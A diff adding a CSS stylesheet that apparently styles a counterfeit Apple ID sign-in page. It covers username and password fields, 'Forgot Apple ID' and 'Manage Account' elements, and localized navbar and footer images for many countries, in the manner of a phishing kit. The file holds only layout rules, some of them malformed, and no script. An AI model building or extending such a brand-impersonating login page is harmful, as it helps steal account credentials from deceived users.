@@ -1,0 +1,572 @@
+@font-face {
+    font-family: 'SF Pro Icons';
+    SRC: url('../css/SFProIcons_regular.woff.ttf') format('truetype');
+}
+
+#clnavbar, #cnnavbar, #esnavbar, #frnavbar, #jpnavbar, #denavbar, #thnavbar, #nlnavbar, #mynavbar, #navbar {
+    height: 44px;
+    top: 0;
+    background-repeat: no-repeat;
+    left: 0;
+    cursor: pointer
+}
+
+#clsub_navbar, #cnsub_navbar, #essub_navbar, #frsub_navbar, #jpsub_navbar, #desub_navbar, #thsub_navbar, #nlsub_navbar, #mysub_navbar, #sub_navbar {
+    height: 61px;
+    top: 44px;
+    backface-visibility: initial;
+    background-repeat: repeat-x;
+    z-index: 3
+}
+
+#clfooter, #cnfooter, #esfooter, #frfooter, #defooter, #thfooter, #nlfooter, #myfooter, #jpfooter {
+    height: 469px
+}
+
+#clfooter, #cnfooter, #esfooter, #frfooter, #defooter, #thfooter, #jpfooter, #nlfooter, #myfooter, #xfooter {
+    width: 95%;
+    top: 700px
+}
+
+#clfooterbawah, #cnfooterbawah, #esfooterbawah, #defooterbawah, #thfooterbawah, #footerbawah, #frfooterbawah, #nlfooterbawah, #pefooterbawah, #arfooterbawah, #mxfooterbawah, #cofooterbawah, #ecfooterbawah, #pyfooterbawah, #uyfooterbawah, #myfooterbawah, #jpfooterbawah {
+    height: 75px;
+    z-index: -1
+}
+
+#container, #xcontent {
+    left: 50%;
+    position: absolute
+}
+
+#Apple_ID, #Manage_Account {
+    text-align: center;
+    width: 100%;
+    z-index: 5;
+    color: rgb(73, 73, 73)
+}
+
+#Apple_ID, #bottom, #clfooter, #clfooterbawah, #clsub_navbar, #cnfooter, #cnfooterbawah, #cnsub_navbar, #container, #esfooter, #esfooterbawah, #essub_navbar, #footerbawah, #frfooterbawah, #frsub_navbar, #head, #jpfooter, #jpfooterbawah, #jpsub_navbar, #desub_navbar, #defooter, #defooterbawah, #thsub_navbar, #thfooter, #thfooterbawah, #mysub_navbar, #myfooter, #myfooterbawah, #nlsub_navbar, #nlfooter, #nlfooterbawah, #pefooterbawah, #arfooterbawah, #mxfooterbawah, #cofooterbawah, #ecfooterbawah, #pyfooterbawah, #uyfooterbawah, #sub_navbar, #xcontent, #xfooter {
+    position: absolute
+}
+
+#Forgot_Apple_ID:focus, #clnavbar, #cnnavbar, #esnavbar, #frnavbar, #jpnavbar, #denavbar, #thnavbar, #nlnavbar, #mynavbar, #navbar, #xbtn {
+    cursor: pointer
+}
+
+#bukapass {
+    cursor: pointer
+}
+
+body {
+    background-color: #fff;
+    color: #000;
+    margin: 0
+}
+
+#bottom {
+    width: 100%;
+    height: 44px;
+    background-image: url(../img/navbar-repeat-login.png);
+    background-repeat: repeat-x;
+    z-index: -1
+}
+
+#container {
+    top: 0;
+    margin-left: -500px;
+    width: 1000px
+}
+
+#xheader {
+    width: 100%;
+    height: 641px;
+    top: 0
+}
+
+#navbar {
+    width: 100%;
+    background-image: url(../img/navbar.png)
+}
+
+#mynavbar {
+    width: 100%;
+    background-image: url(../img/navbar.png)
+}
+
+#cnnavbar {
+    width: 100%;
+    background-image: url(../img/navbar-cn.png)
+}
+
+#frnavbar {
+    width: 100%;
+    background-image: url(../img/navbar-fr.png)
+}
+
+#jpnavbar {
+    width: 100%;
+    background-image: url(../img/navbar-jp.png)
+}
+
+#esnavbar {
+    width: 100%;
+    background-image: url(../img/navbar-es.png)
+}
+
+#clnavbar {
+    width: 100%;
+    background-image: url(../img/navbar-cl.png)
+}
+
+#denavbar {
+    width: 100%;
+    background-image: url(../img/navbar.png)
+}
+
+#thnavbar {
+    width: 100%;
+    background-image: url(../img/navbar-th.png)
+}
+
+#nlnavbar {
+    width: 100%;
+    background-image: url(../img/navbar.png)
+}
+
+.error {
+    background-color: #fefdd2
+}
+
+#sub_navbar {
+    width: 100%;
+    background-image: url(../img/fot.png)
+}
+
+#jpsub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-jp.png)
+}
+
+#frsub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-fr.png)
+}
+
+#cnsub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-cn.png)
+}
+
+#essub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-es.png)
+}
+
+#clsub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-cl.png)
+}
+
+#desub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-de.png)
+}
+
+#thsub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-th.png)
+}
+
+#nlsub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-nl.png)
+}
+
+#mysub_navbar {
+    width: 100%;
+    background-image: url(../img/fot-my.png)
+}
+
+#head {
+    width: 100%;
+    height: 545px;
+    top: 105px;
+    left: 0;
+    z-index: 1
+}
+
+#xfooter {
+    height: 387px;
+    background-image: url(../img/footer-login-desktop.png)
+}
+
+#jpfooter {
+    /*background-image: url(../img/footer-login-desktop-jp.png)*/
+}
+
+#frfooter {
+    background-image: url(../img/footer-login-desktop-fr.png);
+    position: absolute
+}
+
+#cnfooter {
+    background-image: url(../img/footer-login-desktop-cn.png)
+}
+
+#esfooter {
+    background-image: url(../img/footer-login-desktop-es.png)
+}
+
+#clfooter {
+    background-image: url(../img/footer-login-desktop-cl.png)
+}
+
+#defooter {
+    background-image: url(../img/footer-login-desktop-de.png)
+}
+
+#thfooter {
+    background-image: url(../img/footer-login-desktop-th.png)
+}
+
+#nlfooter {
+    background-image: url(../img/footer-login-desktop-nl.png)
+}
+
+#myfooter {
+    background-image: url(../img/footer-login-desktop-my.png)
+}
+
+#containerfooter {
+    position: relative;
+    top: 1130px;
+    width: 100%;
+    clear: both;
+    z-index: 10;
+    height: 3em;
+    margin-top: -3em
+}
+
+#footerbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah.png)
+}
+
+#jpfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-jp.png)
+}
+
+#frfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-fr.png)
+}
+
+#cnfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-cn.png)
+}
+
+#esfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-es.png)
+}
+
+#clfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-cl.png)
+}
+
+#defooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-de.png)
+}
+
+#thfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-th.png)
+}
+
+#nlfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-nl.png)
+}
+
+#pefooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-pe.png)
+}
+
+#arfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-ar.png)
+}
+
+#mxfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-mx.png)
+}
+
+#cofooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-co.png)
+}
+
+#ecfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-ec.png)
+}
+
+#pyfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-py.png)
+}
+
+#uyfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-uy.png)
+}
+
+#myfooterbawah {
+    width: 100%;
+    background-image: url(../img/footerbawah-my.png)
+}
+
+#xcontent {
+    top: 370px;
+    width: 440px;
+    height: 440px;
+    z-index: 4;
+    margin-left: -220px
+}
+
+#Apple_ID {
+    font-size: 55px;
+    font-family: Arial;
+    top: 10px
+}
+
+@font-face {
+    font-family: Myriad;
+    src: url(31642.ttf);
+    font-weight: 300
+}
+
+#Manage_Account {
+    font-size: 22px;
+    font-family: Myriad, "Helvetica Neue", Helvetica, Arial, Verdana, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.2;
+    position: absolute;
+    top: 90px
+}
+
+#xpass, #xuser {
+    border-width: 1px;
+    border-color: #ccc;
+    border-style: solid;
+    height: 43px;
+    padding-left: 10px;
+    font-family: Myriad, "Helvetica Neue", Helvetica, Arial, Verdana, serif;
+    font-size: 18px;
+    font-weight: 400;
+    box-shadow: inherit;
+    -webkit-font-smoothing: antialiased;
+    width: 325px;
+    left: 55px;
+    position: absolute;
+    letter-spacing: .2px
+}
+
+#xuser {
+    top: 151px
+}
+
+#xpass:focus, #xuser:focus {
+    border-color: #0070c9;
+    outline: 0
+}
+
+#xpass {
+    border-bottom-left-radius: 6px;
+    border-bottom-right-radius: 6px;
+    border-top: 0px;
+    top: 194px
+}
+
+#field-separator {
+    width: 325px;
+    position: absolute;
+    left: 55px;
+    top: 193px;
+    background-color: rgba(0, 0, 0, .3);
+    height: 1px;
+    z-index: 1
+}
+
+#login-options-separator {
+    width: 250px;
+    position: absolute;
+    left: 108px;
+    top: 300px;
+    background-color: rgba(0, 0, 0, .3);
+    height: 1px;
+    z-index: 1
+}
+
+#xbtn {
+    border: 0;
+    width: 29px;
+    height: 28px;
+    z-index: 6;
+    top: 203px;
+    left: 340px;
+    position: absolute;
+    display: block
+}
+
+#bukapass {
+    border: 0;
+    width: 29px;
+    height: 28px;
+    z-index: 6;
+    top: 203px;
+    left: 340px;
+    position: absolute;
+    display: block
+}
+
+.xbtn1 {
+    background: url(../img/btn.png)
+}
+
+.xbtn2 {
+    background: url(../img/btn2.png)
+}
+
+#Remember_me {
+    font-size: 14px;
+    letter-spacing: .2px;
+    font-family: "Myriad Set Pro", "Helvetica Neue", Helvetica, Arial, Verdana, sans-serif;
+    color: rgb(73, 73, 73);
+    top: 258px;
+    left: 170px;
+    position: absolute
+}
+
+.option, .option2 {
+    position: absolute;
+    width: 15px;
+    height: 15px;
+    top: 260px;
+    left: 147px
+}
+
+.option {
+    background: url(../img/unchecked.png) no-repeat
+}
+
+.option2 {
+    background: url(../img/checked.png) no-repeat
+}
+
+#Forgot_Apple_ID, #Forgot_Apple_ID:hover {
+    left: 86px;
+    font-size: 14px;
+    font-family: Arial;
+    color: rgb(0, 112, 201);
+    top: 325px;
+    position: absolute
+}
+
+#Forgot_Apple_ID:hover {
+    text-decoration: underline;
+    cursor: pointer
+}
+
+#Forgot_Apple_ID:focus {
+    font-size: 14px;
+    font-family: Arial;
+    color: #fff;
+    top: 390px;
+    left: 120px;
+    position: absolute;
+    text-decoration: underline
+}
+
+#Forgot_Apple_ID:after {
+    font-family: 'SF Pro Icons';
+    content: "";
+}
+
+.fade-in {
+    -webkit-animation: fade-in 1s ease-in-out;
+    -o-animation: fade-in 1s ease-in-out;
+    animation: fade-in 1s ease-in-out
+}
+
+-moz-keyframes fade-in {
+    fromopacity: 0
+}
+
+@-webkit-keyframes fade-in {
+    from {
+        opacity: 0
+    }
+    to {
+        opacity: 1
+    }
+}
+
+@-o-keyframes fade-in {
+    from {
+        opacity: 0
+    }
+    to {
+        opacity: 1
+    }
+}
+
+@-ms-keyframes fade-in {
+    from {
+        opacity: 0
+    }
+    to {
+        opacity: 1
+    }
+}
+
+to {
+    opacity: 1
+}
+
+@keyframes fade-in {
+    from {
+        opacity: 0
+    }
+    to {
+        opacity: 1
+    }
+}
+
+#loading {
+    width: 28px;
+    height: 28px;
+    position: absolute;
+    border: 0;
+    background: url(../img/33.gif);
+    top: 200px;
+    left: 342px;
+    display: none
+}
+
+#loadpass {
+    width: 28px;
+    height: 28px;
+    position: absolute;
+    border: 0;
+    background: url(../img/33.gif);
+    top: 200px;
+    left: 342px;
+    display: none
+}
